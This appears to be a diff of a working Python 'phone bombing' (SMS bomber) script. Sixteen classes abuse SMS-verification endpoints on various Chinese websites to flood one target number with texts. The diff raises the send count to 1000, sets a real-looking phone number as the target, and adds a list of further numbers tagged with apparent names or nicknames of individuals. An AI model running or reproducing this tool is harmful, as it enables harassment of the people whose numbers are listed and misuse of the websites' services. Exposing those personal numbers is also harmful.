@@ -1,8 +1,21 @@
+'''
+/*********************************************************************************
+ *    Copyright:  (C) 2020 zyjin
+ *                  All rights reserved.
+ *    Filename:     Test.py
+ *    Description:  Phone bombing, Easy version, For a specific URL.
+ *    Version:     1.0.0(2020-08-13)
+ *    Author:     zyjin <jzy2410723051@163.com><zzzzyjin@foxmail.com>
+ *    ChangeLog:  1. Copy
+ *                Will do:  1. 多线程 多个手机号互不影响
+*                           2. 多网址  想办法去爬网址，不用自己一个一个手动添加
+ *    Ststus :    Can Use
+ *    Source Code Copy to :  https://github.com/yinzhengmao/note/blob/master/note.py
+ ********************************************************************************/
+'''
 import json
 import requests as r
 import time
-
-
 
 class PostRequest:
     def run(self):
@@ -41,7 +54,6 @@ class GetRequest:
         time.sleep(sleep)
 
 
-
 class SMS_Send_1(PostRequest_json):
     #60s
     def __init__(self, phone):
@@ -58,7 +70,6 @@ class SMS_Send_1(PostRequest_json):
             "verificationSource": ""
         }
 
-
 class SMS_Send_2(PostRequest_json):
     def __init__(self, phone):
         #30s
@@ -72,10 +83,6 @@ class SMS_Send_2(PostRequest_json):
         self.data = {
             "mobile": str(phone)
         }
-
-
-
-
 
 class SMS_Send_3(PostRequest):
     #60s
@@ -97,7 +104,6 @@ b1502%2c%e8%8b%8f%e5%b7%9e%e5%b8%82%2csuzhou"
             "action": "SendCode",
             "Code": "%E8%AF%B7%E8%BE%93%E5%85%A5%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81"
         }
-
 
 class SMS_Send_4(GetRequest):
     def __init__(self, phone):
@@ -121,7 +127,6 @@ class SMS_Send_5(GetRequest):
             "Origin": "https://www.acfun.cn"
         }
 
-
 class SMS_Send_6(GetRequest):
     def __init__(self, phone):
         #60s
@@ -132,7 +137,6 @@ class SMS_Send_6(GetRequest):
             'Referer': 'http://www.lejiaolexue.com/',
             'Origin': 'http://www.lejiaolexue.com'
         }
-
 
 class SMS_Send_7(PostRequest):
     def __init__(self, phone):
@@ -150,7 +154,6 @@ class SMS_Send_7(PostRequest):
             'phone': str(phone),
             'post': '1'
         }
-
 
 class SMS_Send_8(PostRequest):
     def __init__(self, phone):
@@ -170,7 +173,6 @@ class SMS_Send_8(PostRequest):
             'siji3':'81b65b5288fe762372cee72f9c623bf0'
         }
 
-
 class SMS_Send_9(PostRequest_json):
     def __init__(self, phone):
         #60s
@@ -184,7 +186,6 @@ class SMS_Send_9(PostRequest_json):
         self.data = {
             'tel': phone
         }
-
 
 class SMS_Send_10(PostRequest):
     def __init__(self, phone):
@@ -200,7 +201,6 @@ class SMS_Send_10(PostRequest):
             'lxdh' : phone
         }
 
-
 class SMS_Send_11(GetRequest):
     #60s
     def __init__(self, phone):
@@ -213,7 +213,6 @@ class SMS_Send_11(GetRequest):
         self.header = {
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
         }
-
 
 class SMS_Send_12(PostRequest_json):
     def __init__(self, phone):
@@ -275,8 +274,6 @@ c5=1581848728"
             'phone': phone
         }
 
-
-
 class SMS_Send_15(GetRequest):
     #60s
     def __init__(self, phone):
@@ -288,8 +285,6 @@ class SMS_Send_15(GetRequest):
             "Referer": "https://www.maodou.com/",
             "Origin": "https://www.maodou.com"
         }
-
-
 
 class SMS_Send_16(PostRequest):
     def __init__(self, phone):
@@ -307,15 +302,28 @@ class SMS_Send_16(PostRequest):
 
 
 
-
-
 #sleep发送短信的间隔不建议低于4s
 #tel要发送短信的号码
 #number大约轰炸总次数
 
 sleep = 5
-tel = 123456789
-number = 100
+number = 1000
+tel = 13738624333
+'''
+#y ex
+13738624333
+#壮
+tel = 17855338221
+#天赐
+tel = 17855338336
+#yj
+tel = 15906764932
+tel = 13588235607
+#广儿
+tel = 17855337209
+#吴虎
+tel = 18756802586
+'''
 
 if __name__ == '__main__' :
     sms1 = SMS_Send_1(tel)
